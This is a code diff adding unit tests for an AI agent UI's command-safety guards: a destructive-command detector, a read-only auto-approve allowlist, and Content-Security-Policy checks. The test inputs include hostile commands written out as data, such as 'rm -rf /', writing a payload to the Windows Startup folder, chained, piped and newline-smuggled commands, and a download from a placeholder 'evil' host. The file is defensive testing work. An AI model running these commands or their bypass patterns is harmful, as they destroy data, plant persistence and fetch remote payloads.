@@ -9,7 +9,7 @@ import { fileURLToPath } from "url";
 // under CommonJS and exports its pure guard helpers for unit testing.
 const require = createRequire(import.meta.url);
 // @ts-expect-error - importing CJS JS module without types
-const { looksDestructive, resolveInFolder } = require("../../agent-ui/renderer.js");
+const { looksDestructive, resolveInFolder, isReadOnlyCommand } = require("../../agent-ui/renderer.js");
 const __dirname = dirname(fileURLToPath(import.meta.url));
 const agentUiDir = join(__dirname, "..", "..", "agent-ui");
 
@@ -20,6 +20,11 @@ describe("renderer looksDestructive (plan-step gate)", () => {
     "shutdown /s /t 0",
     "Remove-Item -Recurse -Force C:\\",
     "echo done && rm -rf ~/",
+    "Remove-Item -Force -Recurse x",       // reversed flag order
+    "rm -fo -rec x",                        // abbreviated flags
+    "Set-Content -Path x -Value y",         // PowerShell file writer
+    '"payload" > "$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\run.bat"',
+    "echo evil >> boot.ps1",                // append redirection
   ];
   const safe = ["npm install", "git pull", "node build.js", "ls"];
 
@@ -43,6 +48,66 @@ describe("renderer looksDestructive (typed-terminal confirm escalation)", () => 
   });
   it("does not gate a routine typed command like 'npm run build'", () => {
     expect(looksDestructive("npm run build")).toBeNull();
+  });
+});
+
+describe("renderer isReadOnlyCommand (terminal-step auto-approve allowlist)", () => {
+  // Terminal plan steps ALWAYS require per-step confirmation unless they match
+  // this strict read-only allowlist — auto-approve no longer executes arbitrary
+  // LLM-authored commands.
+  const readOnly = [
+    "git status",
+    "git log --oneline -5",
+    "git diff HEAD~1",
+    "git branch",
+    "Get-ChildItem",
+    "Get-ChildItem -Path src",
+    "dir",
+    "ls -la",
+    "Get-Content package.json",
+    "type README.md",
+    "cat src/app.js",
+    "Get-Process",
+    "node --version",
+    "npm ls",
+    "pwd",
+    "Get-Location",
+    "whoami",
+    "systeminfo",
+  ];
+
+  it.each(readOnly)("auto-approves read-only command: %s", (cmd) => {
+    expect(isReadOnlyCommand(cmd)).toBe(true);
+  });
+
+  const requiresConfirm = [
+    "npm install",
+    "git push origin main",
+    "git checkout -b x",
+    "node script.js",
+    "rm -rf /",
+    "Set-Content -Path x -Value y",
+    "echo payload > startup.bat",       // redirection
+    "git status && rm -rf /",           // chained
+    "Get-Content x | iex",              // piped
+    "git diff; calc.exe",               // chained
+    "ls `whoami`",                      // backtick subexpression
+    "Get-Content $(whoami)",            // subexpression
+    "git status\ncalc.exe",             // newline smuggling
+    "",
+    // PowerShell command-grouping parens execute their contents exactly like
+    // `$(...)` — these were live bypasses before the `[(){}$]` disqualifier.
+    "Get-Content (Start-Process calc.exe)",
+    "Get-Content (iwr http://evil/x -OutFile run.bat)",
+    "Get-ChildItem (Move-Item C:/a C:/b)",
+    "Get-Content (New-Item -ItemType File -Path run.bat)",
+    "git log (Rename-Item a b)",
+    "Get-Content {Start-Process calc.exe}", // script block
+    "Get-Content $env:USERPROFILE",         // variable expansion smuggling
+  ];
+
+  it.each(requiresConfirm)("requires confirmation for %j", (cmd) => {
+    expect(isReadOnlyCommand(cmd)).toBe(false);
   });
 });
 
@@ -106,5 +171,24 @@ describe("agent-ui renderer supply-chain and log rendering invariants", () => {
     expect(rendererJs).toContain("desc.textContent = r.description");
     expect(rendererJs).not.toContain("onclick=\"cloneRepo");
     expect(rendererJs).not.toContain("list.innerHTML = repos.map");
+  });
+
+  it("ships no inline on*= handlers anywhere (CSP script-src 'self' blocks them)", () => {
+    const indexHtml = readFileSync(join(agentUiDir, "index.html"), "utf8");
+    const rendererJs = readFileSync(join(agentUiDir, "renderer.js"), "utf8");
+    // Inline handler attributes (onclick="..." etc.) — both in static HTML and
+    // in HTML template strings the renderer injects via innerHTML.
+    const inlineHandler = /\son(?:click|input|keydown|keyup|load|error|change|submit)\s*=\s*["']/i;
+
+    expect(indexHtml).not.toMatch(inlineHandler);
+    expect(rendererJs).not.toMatch(inlineHandler);
+  });
+
+  it("declares a CSP via <meta http-equiv> mirroring the main-process header", () => {
+    const indexHtml = readFileSync(join(agentUiDir, "index.html"), "utf8");
+
+    expect(indexHtml).toMatch(/http-equiv="Content-Security-Policy"/);
+    expect(indexHtml).toMatch(/default-src 'none'/);
+    expect(indexHtml).toMatch(/script-src 'self'/);
   });
 });
